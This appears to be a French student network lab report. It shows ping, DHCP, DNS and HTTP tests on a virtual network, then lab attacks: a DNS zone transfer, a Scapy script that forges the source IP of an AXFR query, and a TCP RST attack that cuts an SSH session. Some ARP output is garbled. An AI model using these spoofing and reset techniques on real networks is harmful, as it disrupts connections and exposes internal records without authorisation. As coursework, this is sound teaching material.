# 3 - La Partie 3.

## Partie 1 :

**Ping d'un client du `LAN1` vers un client dans le `LAN2`**
```
PC1> show ip
NAME
: PC1[1]
IP/MASK : 10.3.1.1/24
GATEWAY : 10.3.1.254
DNS
MAC
00:50:86:76:45:00
LPORT : 10000
RHOST:PORT
127.0.0.1:10000
MTU : 1500

PC1> ping 10.3.2.2
84 bytes from 10.3.2.2 icmp_seq=1 ttl=62 time=45.862 ms
84 bytes from 10.3.2.2 icmp_seq=2 ttl=62 time=40.574 ms
84 bytes from 10.3.2.2 icmp_seq=4 ttl=62 time=30.458 ms
84 bytes from 10.3.2.2 icmp_seq=5 ttl=62 time=41.012 ms
```

**Afficher les adresses MAC des routeurs**
```
R2#show arp
Protocol Address Age (min) Hardware Addr Type Interface
Internet 10.3.2.1 24 c401.05da.0001 ARPA FastEthernet0/0
Internet 10.3.2.2  - c402.060a.0000 ARPA FastEthernet0/0
Internet 10.3.2.2   0  0050.7966.6802 ARPA FastEthernet1/0
Internet 10.3.2.1  17 050.7966.6803 ARPA FastEthernet1/0
Internet 10.3.2.254 - c402.060.0010 ARPA FastEthernet1/0
```

***

**Prouver qu'on a déjà un accès internet sur `r1`**
```
R1#ping 1.1.1.1
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/79/96 ms
```

**Accès internet depuis le `LAN1`**
```
PC1> ping 1.1.1.1

184 bytes from 1.1.1.1 icmp_seq=1 ttl=56 time=54.235 ms
184 bytes from 1.1.1.1 icmp_seq=2 ttl=56 time=25.234 ms
184 bytes from 1.1.1.1 icmp_seq=3 ttl=56 time=29.354 ms
```

**Accès internet depuis le `LAN2`**
```
PC3> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=57 time=55.214 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=57 time=57.231 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=57 time=62.321 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=57 time=30.213 ms
```
---

## Partie 2 :

### A. VLANs
**Test de `ping`**
```
PC1> ping 10.3.1.2

84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=1.231 ms
84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=3.211 ms
84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=2.321 ms
```

### B. Routeur
**Tests de `ping`**
```
R1#ping 10.3.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.1, timeout is 4 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 49/54/61 ms
R1#ping 10.3.2.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.1, timeout is 4 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 32/42/70 ms
'''
'''
R1#ping 10.3.1.2

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.2, timeout is 4 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 50/53/60 ms
```

```
PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.3.1.1/24
GATEWAY     : 10.3.1.254
DNS         : 
MAC         : 00:50:86:76:45:00
LPORT       : 10008
RHOST:PORT  : 127.0.0.1:10008
MTU         : 1500

PC1> ping 10.3.2.1

84 bytes from 10.3.2.1 icmp_seq=1 ttl=63 time=12.355 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=15.214 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=17.235 ms
```

**Tests de `ping`**
```
R1#ping 1.1.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 4 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 79/95/112 ms
```

```
PC1> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=25.124 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=32.214 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=25.214 ms
```

```
PC2> ping 1.1.1.1        

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=32.124 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=31.547 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=36.214 ms
```

## Partie 3 :

### A. DHCP
**Prouvez avec un VPCS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> show ip      

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 1.1.1.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 43054, 43066/21533/37682
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:86:76:45:03
LPORT       : 10009
RHOST:PORT  : 127.0.0.1:10009
MTU         : 1500

PC4> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=22.548 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=21.253 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=15.357 ms

```

### B. DNS
**Tests résolutions DNS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> show ip

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 10.3.3.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 42680, 42689/21344/37352
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:86:76:45:03
LPORT       : 10030
RHOST:PORT  : 127.0.0.1:10030
MTU         : 1500

PC4> ping efrei.fr  
efrei.fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=59 time=54.235 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=59 time=35.487 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=59 time=43.254 ms

PC4> ping dns.tp3.b2 
dns.tp3.b2 resolved to 10.3.3.1

84 bytes from 10.3.3.1 icmp_seq=1 ttl=63 time=25.235 ms
84 bytes from 10.3.3.1 icmp_seq=2 ttl=63 time=15.986 ms
84 bytes from 10.3.3.1 icmp_seq=3 ttl=63 time=21.549 ms
```

### C. HTTP
**Preuve avec un client**
```
root@localhost resox]# curl web.tp3.b2 | head

<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>


[root@localhost toto]# curl supersite.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>
```

### A. DNS
**Faire la requête pour get l'enregistrement AXFR**

```
[resox@localhost ~]$ dig axfr @dns.tp3.b2 tp3.b2

; <<>> DiG 9.16.23-RH <<>> axfr @dns.tp3.b2 tp3.b2
; (1 server found)
;; global options: +cmd
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2. 86400 IN NS dns.tp3.b2. 
zobhumide.tp3.b2. 86400 IN A 10.3.3.4 
dns.tp3.b2. 86400 IN A 10.3.3.1 
zizi.tp3.b2. 86400 IN A 10.3.3.6 
leolefrro.tp3.b2. 86400 IN A 10.3.3.5 
sitedezinzin.tp3.b2. 86400 IN A 10.3.3.3 
web.tp3.b2. 86400 IN A 10.3.3.2 
web2.tp3.b2. 86400 IN A 10.3.3.4 
web3.tp3.b2. 86400 IN A 10.3.3.5 
web4.tp3.b2. 86400 IN A 10.3.3.6 
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
```

### B. Flood

**Spoof DNS query**
```
from scapy.all import *

answer = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qtype="AXFR", qname="tp3.b2")))

print(answer[DNS].summary())
```

### C. TCP
**Mettre en place une attaque TCP RST**
```
[resox@localhost]# python3 reset_tcp.py
ip src >> 10.3.3.1
ip dst >> 10.3.3.2
port src >> 56100
port dst >> 22
Seq nb >> 2819567537
Ack nb >> 3424985478
[ 3029.781295 ] device enp0s3 entered promiscuous mode
[ 3029.781295 ] device enp0s3 left promiscuous mode
```

```
[resox@localhost ~]$ aclient_loop: send disconnect: Broken pipe
```

C'est la fin des haricots (cad qu'on a pété le bordel // on est riche // next step pirater la nasa)